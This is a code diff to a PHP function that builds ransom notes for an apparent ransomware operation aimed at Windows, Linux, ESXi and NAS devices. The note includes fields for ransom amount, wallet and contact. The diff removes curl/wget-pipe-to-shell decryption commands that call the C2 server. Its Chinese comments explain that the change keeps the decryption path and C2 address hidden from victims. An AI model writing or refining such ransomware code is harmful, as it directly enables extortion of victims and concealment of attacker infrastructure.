@@ -114,32 +114,12 @@ function build_ransom_note($r, $plat, $c2='') {
     $c = $r['contact'];
     $p = $r['price'];
     $w = $r['wallet'];
-    $srv = preg_replace('#/handshake\.php$#', '', $c2);
-    if ($srv === '') $srv = 'http://<后台地址>';
-    // 解密一律走零依赖脚本：Linux/macOS 用 jasmin_unlock.sh (纯 openssl)，
-    // Windows 用 jasmin_unlock.ps1 (纯 PowerShell 7+，无需编译 exe)
-    // 三个 sh 平台（esxi / qnap / synology）都靠 SSH 进设备后用同一个零依赖脚本。
-    // 此前它们和 linux/macos 一起落进 else，勒索信上会写 "Linux / macOS" ——
-    // 对着一台 NAS 或 ESXi 主机教受害者用错的方法。
-    if ($plat === 'win') {
-        $dec = "Windows (requires PowerShell 7+)\n"
-              ."  curl.exe -sL {$srv}/payloads/jasmin_unlock.ps1 -o unlock.ps1\n"
-              ."  pwsh -File unlock.ps1 -Server {$srv} -K \"<passphrase>\"";
-    } elseif (in_array($plat, ['esxi','qnap','synology'], true)) {
-        $how = [
-            'esxi'     => 'SSH into the ESXi host (Host > Manage > Services > TSM-SSH)',
-            'qnap'     => 'first enable SSH: QNAP Control Panel > Network & File Services',
-            'synology' => 'first enable SSH: Synology Control Panel > Terminal & SNMP',
-        ][$plat];
-        $dec = "NAS / hypervisor host - POSIX shell (pure openssl, no dependencies required)\n"
-              ."  # {$how}\n"
-              ."  curl -sL {$srv}/payloads/jasmin_unlock.sh | sh -s {$srv} \"<passphrase>\"\n"
-              ."  # if curl is unavailable:  wget -qO- {$srv}/payloads/jasmin_unlock.sh | sh -s {$srv} \"<passphrase>\"";
-    } else {
-        $dec = "Linux / macOS (pure openssl, no dependencies required)\n"
-              ."  curl -sL {$srv}/payloads/jasmin_unlock.sh | sh -s {$srv} \"<passphrase>\"";
-    }
-    $dec.= "\n  (Decrypts ALL encrypted files by default; append specific folders to limit scope)";
+    // ★ 勒索信正文【不含】任何解密教程/命令 —— 只保留识别信息(系统ID)与联系方式。
+    //   此前会按平台把 jasmin_unlock.ps1 / jasmin_unlock.sh 的下载与执行命令
+    //   写进正文，等于把解密路径直接交给受害者；且明文写出 C2 服务器地址。
+    //   操作员侧的完整解密步骤另有出处：后台「解密教程」面板
+    //   (includes/decrypt_panel.html) 与每台受害主机行的「一键解密」展开。
+    //   $plat / $c2 形参保留以兼容既有调用点（当前不再参与正文构建）。
     $n = "╔══════════════════════════════════════════╗\n";
     $n.= "║  {$t}\n";
     // 标题若已含 ENCRYPT 字样则不再补副标题，避免两行重复
@@ -152,7 +132,6 @@ function build_ransom_note($r, $plat, $c2='') {
     if ($p) $n.= "Ransom Amount: {$p}\n";
     if ($w) $n.= "Payment Address: {$w}\n";
     if ($c) $n.= "Contact: {$c}\n";
-    $n.= "\nHow to Decrypt:\n{$dec}\n";
     $n.= "\nSha-256 integrity verification guarantees 100% file restoration.\n";
     return $n;
 }
